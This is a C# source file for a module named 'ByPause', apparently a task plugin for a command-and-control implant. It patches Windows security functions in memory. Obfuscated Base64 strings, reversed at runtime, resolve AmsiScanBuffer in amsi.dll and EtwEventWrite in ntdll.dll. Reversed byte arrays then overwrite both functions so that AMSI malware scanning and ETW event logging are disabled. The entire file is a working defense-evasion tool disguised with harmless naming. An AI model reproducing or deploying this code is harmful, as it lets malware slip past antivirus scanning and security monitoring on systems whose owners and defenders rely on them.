using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace ByPause
{
    public class ByPause
    {
        public string Name => "bypause";
        public dynamic DotsProperty { get; set; }

        public string Execute(dynamic task)
        {
            uint oldProtect;

            var lib = LoadLibrary(new string(Encoding.UTF8.GetString(Convert.FromBase64String("bGxkLmlzbWE=")).ToCharArray().Reverse().ToArray()));
            IntPtr addy = GetProcAddress(lib, new string(Encoding.UTF8.GetString(Convert.FromBase64String("cmVmZnVCbmFjU2lzbUE=")).ToCharArray().Reverse().ToArray()));

            var patch = GetFirstPause;

            _ = VirtualProtect(addy, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, addy, patch.Length);

            _ = VirtualProtect(addy, (UIntPtr)patch.Length, oldProtect, out uint _);

            lib = LoadLibrary(new string(Encoding.UTF8.GetString(Convert.FromBase64String("bGxkLmxsZHRu")).ToCharArray().Reverse().ToArray()));
            addy = GetProcAddress(lib, new string(Encoding.UTF8.GetString(Convert.FromBase64String("ZXRpcld0bmV2RXd0RQ==")).ToCharArray().Reverse().ToArray()));

            patch = GetSecondPause;

            _ = VirtualProtect(addy, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, addy, patch.Length);

            _ = VirtualProtect(addy, (UIntPtr)patch.Length, oldProtect, out uint _);

            return "Succesfully paused";
        }

        private byte[] GetFirstPause
        {
            get
            {
                if (Is64Bit)
                {
                    byte[] pause_array = new byte[] { 0xC3, 0x80, 0x07, 0x00, 0x57, 0xB8 };
                    Array.Reverse(pause_array);
                    return pause_array;
                }
                else
                {
                    byte[] pause_array = new byte[] { 0x00, 0x18, 0xC2, 0x80, 0x07, 0x00, 0x57, 0xB8 };
                    Array.Reverse(pause_array);
                    return pause_array;
                }
            }
        }

        private byte[] GetSecondPause
        {
            get
            {
                if (Is64Bit)
                {
                    byte[] pause_array = new byte[] { 0x00, 0xC3 };
                    Array.Reverse(pause_array);
                    return pause_array;
                }
                else
                {
                    byte[] pause_array = new byte[] { 0x00, 0x14, 0xC2 };
                    Array.Reverse(pause_array);
                    return pause_array;
                }
            }
        }


        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
            string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);
    }
}
